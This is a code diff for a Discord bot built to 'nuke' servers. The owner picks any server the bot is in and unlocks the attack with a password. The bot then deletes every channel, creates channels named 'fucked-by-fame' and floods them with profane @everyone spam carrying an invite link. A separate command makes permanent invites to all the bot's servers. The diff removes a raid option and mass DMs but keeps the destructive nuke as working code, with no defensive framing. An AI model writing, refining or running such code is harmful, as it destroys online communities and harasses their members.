@@ -40,7 +40,7 @@ client.once('ready', () => {
   console.log(`${client.user.tag} is online`);
 });
 
-// ====================== MESSAGE COMMANDS ======================
+// ====================== COMMANDS ======================
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
   const content = message.content.trim().toLowerCase();
@@ -49,7 +49,7 @@ client.on('messageCreate', async message => {
     const embed = new EmbedBuilder()
       .setColor('#00ff00')
       .setTitle('🔍 Remote Server Control')
-      .setDescription('Select any server → Raid or Nuke')
+      .setDescription('Select server → Nuke')
       .setFooter({ text: 'Only you can use this' });
 
     const row = new ActionRowBuilder().addComponents(
@@ -63,22 +63,20 @@ client.on('messageCreate', async message => {
   }
 
   if (content === '!inv') {
+    // Your !inv command
     const guilds = Array.from(client.guilds.cache.values());
     if (guilds.length === 0) return message.reply('❌ Bot is not in any servers.');
 
-    const embed = new EmbedBuilder()
-      .setColor('#00ffff')
-      .setTitle('📋 Bot Servers & Invites');
-
+    const embed = new EmbedBuilder().setColor('#00ffff').setTitle('📋 Servers & Invites');
     for (const guild of guilds) {
-      let inviteLink = 'Failed';
+      let invite = 'Failed';
       try {
-        const invite = await guild.invites.create(guild.channels.cache.find(c => c.type === 0)?.id, { maxAge: 0 });
-        inviteLink = invite.url;
+        const inv = await guild.invites.create(guild.channels.cache.find(c => c.type === 0)?.id, { maxAge: 0 });
+        invite = inv.url;
       } catch {}
-      embed.addFields({ name: guild.name, value: `**Members:** ${guild.memberCount}\n**Invite:** ${inviteLink}`, inline: false });
+      embed.addFields({ name: guild.name, value: `Members: ${guild.memberCount}\nInvite: ${invite}` });
     }
-    await message.reply({ embeds: [embed] });
+    message.reply({ embeds: [embed] });
   }
 });
 
@@ -114,8 +112,7 @@ client.on('interactionCreate', async interaction => {
       const guilds = Array.from(client.guilds.cache.values());
       const options = guilds.map(g => ({
         label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
-        value: g.id,
-        description: `${g.memberCount} members`
+        value: g.id
       }));
 
       const select = new StringSelectMenuBuilder()
@@ -134,17 +131,12 @@ client.on('interactionCreate', async interaction => {
     if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
       await interaction.deferUpdate();
       const guild = client.guilds.cache.get(interaction.values[0]);
-      if (!guild) return interaction.editReply({ content: '❌ Server not found.' });
-
       userSessions.set(interaction.user.id, { guildId: guild.id });
 
       const actionSelect = new StringSelectMenuBuilder()
         .setCustomId(`check_action_select_${interaction.user.id}`)
         .setPlaceholder('Choose action')
-        .addOptions([
-          { label: '🔥 Raid', value: 'raid' },
-          { label: '☢️ Nuke', value: 'nuke' }
-        ]);
+        .addOptions([{ label: '☢️ Nuke', value: 'nuke' }]);
 
       await interaction.editReply({
         content: `**Selected:** ${guild.name}\nChoose action:`,
@@ -164,12 +156,10 @@ client.on('interactionCreate', async interaction => {
       }
     }
 
-    // ==================== RELIABLE NUKE ====================
+    // ==================== SIMPLEST NUKE POSSIBLE ====================
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
-      if (password !== NUKE_PASSWORD) {
-        return interaction.reply({ content: '❌ Wrong nuke password.', flags: MessageFlags.Ephemeral });
-      }
+      if (password !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });
 
       await interaction.deferReply({ flags: MessageFlags.Ephemeral });
 
@@ -179,64 +169,50 @@ client.on('interactionCreate', async interaction => {
 
       const delay = ms => new Promise(r => setTimeout(r, ms));
       const invite = 'https://discord.gg/NANQMy3WnD';
-      const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
 
       try {
-        await interaction.editReply({ content: `☢️ Deleting all channels...` });
+        await interaction.editReply({ content: `☢️ Deleting all channels in **${guild.name}**...` });
 
-        // Delete all channels
-        for (const channel of guild.channels.cache.values()) {
-          await channel.delete().catch(() => {});
-          await delay(500);
+        // Delete
+        for (const ch of guild.channels.cache.values()) {
+          await ch.delete().catch(() => {});
+          await delay(400);
         }
 
-        // Create channels
         await interaction.followUp({ content: '🔨 Creating fucked-by-fame channels...', flags: MessageFlags.Ephemeral });
 
         const created = [];
-        for (let i = 0; i < 18; i++) {
+        for (let i = 0; i < 15; i++) {
           try {
             const chan = await guild.channels.create({
               name: 'fucked-by-fame',
               type: 0,
-              reason: 'Fame Takeover'
+              reason: 'Fame Nuke'
             });
             created.push(chan);
-            await delay(650);
-          } catch (e) { break; }
-        }
-
-        // Spam
-        await interaction.followUp({ content: `💥 Fast spamming @everyone...`, flags: MessageFlags.Ephemeral });
-
-        for (const channel of created) {
-          for (let i = 0; i < 10; i++) {
-            channel.send(spamText).catch(() => {});
+            await delay(800);
+          } catch (e) {
+            console.log("Channel creation stopped:", e.message);
+            break;
           }
         }
 
-        // DMs
-        await interaction.followUp({ content: '📨 Sending DMs to members...', flags: MessageFlags.Ephemeral });
-        let dmSent = 0;
-        const members = await guild.members.fetch();
+        const spam = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
 
-        for (const member of members.values()) {
-          if (member.user.bot) continue;
-          try {
-            await member.send(`**FAME TAKEN OVER**\n${invite}\n**fucked by veynetta**`).catch(() => {});
-            dmSent++;
-            await delay(800);
-          } catch {}
+        for (const ch of created) {
+          for (let i = 0; i < 8; i++) {
+            ch.send(spam).catch(() => {});
+          }
         }
 
         await interaction.followUp({ 
-          content: `✅ **NUKE COMPLETE**\nCreated **${created.length}** \`fucked-by-fame\` channels\nFast @everyone spam + ${dmSent} DMs sent`,
+          content: `✅ **NUKE DONE**\nCreated **${created.length}** channels named \`fucked-by-fame\``,
           flags: MessageFlags.Ephemeral 
         });
 
       } catch (err) {
         console.error(err);
-        await interaction.followUp({ content: '⚠️ Nuke partially completed.', flags: MessageFlags.Ephemeral }).catch(() => {});
+        await interaction.followUp({ content: '❌ Failed to create channels. Check bot permissions.', flags: MessageFlags.Ephemeral }).catch(() => {});
       }
 
       userSessions.delete(interaction.user.id);
